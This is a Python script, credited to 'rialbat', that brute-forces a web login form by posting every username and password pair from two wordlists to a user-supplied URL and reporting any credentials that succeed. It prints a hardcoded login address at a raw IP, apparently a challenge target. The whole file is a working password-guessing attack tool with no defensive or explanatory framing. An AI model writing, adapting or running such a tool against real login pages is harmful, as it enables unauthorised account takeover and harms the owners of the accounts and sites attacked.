#includes
import requests
from argparse import ArgumentParser
class colors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    CYAN  = "\033[1;36m"
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = "\033[0;0m"
#
def main():
    print ("\n\033[91m[*] \033[93mThis brute was created by \033[92mrialbat\033[93m!\n")
    try:
        response = requests.get("http://www.google.com")
        print (colors.FAIL + "[*]" + colors.OKGREEN + " Internet is on!\n" + colors.RESET)
    except requests.ConnectionError:
        print (colors.FAIL + "[*] Internet is off!\n[*] Check Internet connection!" + colors.RESET)
        exit(1)
    #defines
    print('\033[32m ---------------------INPUT DATA---------------------')
    url = raw_input("\033[91m[*] \033[92mEnter current URL: ")
    try:
        checkURL = requests.get(url)
    except requests.exceptions.MissingSchema:
        print ("\033[91m[*] Invalide URL format!")
        exit(1)
    except requests.ConnectionError:
        print ("\033[91m[*] Invalide URL!")
        exit(1)
    print(" ----------------------------------------------------\033[0;0m\n")
    userField = 'username' #change this 
    passwordField = 'password' #change this 
    BadReq = '' #change this 
    GoodReq = '' #change this 
    #
    parser = ArgumentParser()
    parser.add_argument("debug", type = int, help="Add 1 for starting debug mode or anything else for continue!")
    args = parser.parse_args()
    #variables
    flag = False
    try:
        users = open('users.txt').readlines()
    except Exception:
        print (colors.FAIL + colors.BOLD + "File users.txt doesn't exist.")
        exit(1)
    try:
        passwords = open('passwords.txt').readlines()
    except Exception:
        print (colors.FAIL + colors.BOLD + "File passwords.txt doesn't exist.")
        exit(1)
    #
    print (colors.OKGREEN + "Connecting to http://35.196.135.216/1c42775f81/login")
    print ("Please Wait...\n")
    failed_aftertry = 0
    for user in users:
        for password in passwords:
            if flag == False:
                info = {userField: user.replace('\n', ''),
                        passwordField: password.replace('\n', '')}
                print (colors.WARNING + "Trying username: " + user) 
                data = requests.post(url, data=info)
                if "404 - Not Found" in data.text:
                    if failed_aftertry > 5:
                        print (colors.FAIL + "Connection failed!")
                        break
                    else:
                        failed_aftertry = failed_aftertry + 1
                        print (colors.FAIL + "404 Not Found")
                else:
                    if BadReq in data.text:
                        print (colors.FAIL + "Failed to connect with username: " + user + "and password: " + password)
                    else:
                        if GoodReq in data.text:
                            print (colors.OKGREEN + "\n---------------------------------------")
                            print ("\nUser found! \n\nUsername is: " + user + "Password is: " + password)
                            print ("---------------------------------------" + colors.RESET)
                            flag = True
                            break
                        else:
                            print (colors.OKGREEN + "Username is: " + user + " and password is: " + password) 
            else:
                Just_to_pause_the_script = raw_input(colors.CYAN +  "Thats all folks!\nPress ENTER to exit!")
                if args.debug == 1:
                    print (data.text)
                exit(1)
    Just_to_pause_the_script = raw_input(colors.CYAN +  "Thats all folks!\nPress ENTER to exit!")
    if args.debug == 1:
        print (data.text)
    exit(1)
try:
   main()
except KeyboardInterrupt:
    print(colors.FAIL + "\n[*] Script has been stopped!")
